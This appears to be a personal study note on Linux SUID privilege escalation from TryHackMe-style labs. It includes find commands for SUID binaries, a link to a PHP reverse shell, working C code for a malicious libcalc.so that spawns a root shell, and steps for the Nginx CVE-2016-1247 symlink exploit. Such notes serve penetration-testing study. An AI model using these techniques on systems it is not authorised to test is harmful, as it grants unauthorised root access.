SGID
SUID - which allows users to executes file permissions with specified user. The user mentioned in the SUID will run with higher privileges [[Linux Overview#User Privileges]]
STID -

Not everything would under SUID is vulnerable. We have to do the analysis of which file accessing the SUID.
![[Pasted image 20230808110247.png]]
#find 
```shell
find / -perm -u=s -type f -ls 2>/dev/null
```
	-u=s all files owned by the root user
	-type f   mentions filetype

![[Pasted image 20230808110811.png]]

***If the SUID is mentioned in any of the executable binary files, try to cross check with GTFO bins.***

#challenge Vulnversity in TryHackMe

#reverse_shell [PHP_reverse_shell](https://github.com/pentestmonkey/php-reverse-shell)
run the find command with perm of -u=s
if systemctl is implemented with suid. try to explore in the #gtfobins 

#### Other SUID Escalations: 
###### Shared Object Injections:

#find 
1) 
```shell
find / -type f -perm -0400 -ls 2>/dev/null 
```
	-0400  mentions only owner of file have read privileges

![[Pasted image 20230808121027.png]]
![[Pasted image 20230808122827.png|600]]
**suid-so** is looking for some files which doesn't exist in the files or directory. 

From here we can create a injected file in the name of `libcalc.so`  with the same directory.
2) 
```c libcalc.so
#include <stdio.h>
#include <stdlib.h>
static void inject() _attribute_((constructor));

void inject(){
	system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
	this will create a bash file in the name of libcalc.so

3) `mkdir /home/user/.config`
4) 
```shell
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/libcalc.c
```

If does it looks for any file name `libcalc.so`. we will get pop out shell of bash with root. because the suid is running on the root.
	
[[Strace]]

![[Pasted image 20230808121712.png|400]]
![[Pasted image 20230808121726.png]]

##### Binary Symlinks:
#symboliclinks - A file contains a reference to another file or directory in the absolute form of relative path.
#References [[Linux Overview#Hard Links & Soft Links]]

**Nginx** - http and reverse proxy server.
	Issue in the vuln is permission of the log have been created by nginx 
	[CVE-2016-1247](https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html)
		Basically this vuln point outs the symbolic link of malicious file to log file.
How this works? 
	nginx version should be < 1.6.2
	sudo should have privileges as run as root
1) He logged in as low level user in the machine as (www-data)
2) then used LinuxExploit suggester on the machien. it suggests the machine vuln with CVE-2016-1247.
3) downloaded the CVE exploit and run it in the machine. Actually the CVE looks for the admin to restart the nginx server with rotating the error log.
		![[Pasted image 20230808142612.png|600]]
4)  Using the command, restarting the server by rotating the log file.
		![[Pasted image 20230808142400.png]]
